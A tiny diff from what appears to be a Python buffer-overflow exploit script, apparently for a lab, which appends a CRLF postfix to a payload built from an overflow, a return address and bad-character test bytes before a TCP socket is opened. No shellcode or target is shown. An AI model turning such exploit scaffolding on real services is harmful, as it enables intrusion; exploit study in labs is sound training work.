@@ -62,7 +62,7 @@ badchars = (
 )
 postfix = "\r\n"
 
-payload = prefix + overflow + retn + badchars
+payload = prefix + overflow + retn + badchars + postfix
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
